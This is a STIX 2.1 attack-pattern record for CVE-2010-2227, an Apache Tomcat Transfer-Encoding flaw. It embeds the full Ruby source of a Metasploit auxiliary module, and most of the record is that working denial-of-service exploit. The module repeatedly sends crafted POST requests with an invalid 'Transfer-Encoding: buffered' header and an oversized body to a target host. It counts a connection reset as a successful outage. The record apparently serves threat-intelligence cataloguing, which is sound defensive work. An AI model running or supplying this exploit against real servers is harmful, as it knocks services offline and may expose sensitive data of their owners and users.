{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--49ecd8fa-2096-4aca-9955-2438ca941071",
    "created": "2024-08-14T16:26:14.663894Z",
    "modified": "2024-08-14T16:26:14.663899Z",
    "name": "Apache Tomcat Transfer-Encoding Information Disclosure and DoS",
    "description": " Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27, and 7.0.0 beta does not properly handle an invalid Transfer-Encoding header, which allows remote attackers to cause a denial of service (application outage) or obtain sensitive information via a crafted header that interferes with \"recycling of a buffer.\" ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/apache_tomcat_transfer_encoding.rb",
            "external_id": "apache_tomcat_transfer_encoding.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-2227"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::Tcp\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Apache Tomcat Transfer-Encoding Information Disclosure and DoS',\n      'Description'    => %q{\n          Apache Tomcat 5.5.0 through 5.5.29, 6.0.0 through 6.0.27, and 7.0.0 beta does not\n        properly handle an invalid Transfer-Encoding header, which allows remote attackers\n        to cause a denial of service (application outage) or obtain sensitive information\n        via a crafted header that interferes with \"recycling of a buffer.\"\n      },\n      'Author'         =>\n        [\n          'Steve Jones', # original discoverer\n          'Hoagie <andi[at]void.at>', # original public exploit\n          'Paulino Calderon <calderon[at]websec.mx>', # metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2010-2227' ],\n          [ 'OSVDB', '66319' ],\n          [ 'BID', '41544' ]\n        ],\n      'DisclosureDate' => '2010-07-09'))\n\n    register_options(\n      [\n        Opt::RPORT(8000),\n        OptInt.new('RLIMIT', [ true,  \"Number of requests to send\", 25])\n      ])\n  end\n\n  def run\n    for x in 1..datastore['RLIMIT']\n      begin\n        connect\n        print_status(\"Sending DoS packet #{x} to #{rhost}:#{rport}\")\n\n        sploit = \"POST / HTTP/1.1\\r\\n\"\n        sploit << \"Host: \" + rhost + \"\\r\\n\"\n        sploit << \"Transfer-Encoding: buffered\\r\\n\"\n        sploit << \"Content-Length: 65537\\r\\n\\r\\n\"\n        sploit << Rex::Text.rand_text_alpha(1) * 65537\n\n        sock.put(sploit + \"\\r\\n\\r\\n\")\n        disconnect\n\n        print_error(\"DoS packet unsuccessful\")\n      rescue ::Rex::ConnectionRefused\n        print_error(\"Unable to connect to #{rhost}:#{rport}\")\n      rescue ::Errno::ECONNRESET\n        print_good(\"DoS packet successful. #{rhost} not responding.\")\n      rescue ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        print_error(\"Couldn't connect to #{rhost}:#{rport}\")\n      rescue ::Timeout::Error, ::Errno::EPIPE\n      end\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2010-07-09"
}